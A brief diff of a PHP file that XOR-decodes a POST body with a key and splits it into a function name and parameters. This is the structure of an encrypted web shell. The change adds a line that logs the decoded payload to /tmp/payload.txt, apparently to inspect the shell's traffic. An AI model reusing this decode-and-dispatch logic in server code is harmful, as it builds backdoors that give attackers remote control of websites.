@@ -11,7 +11,7 @@ $post=$t($post."");
 for($i=0;$i<strlen($post);$i++) {
 	$post[$i] = $post[$i]^$key[$i+1&15]; 
 }
-
+file_put_contents("/tmp/payload.txt", $post);
 $arr=explode('|',$post);
 $func=$arr[0];
 $params=$arr[1];
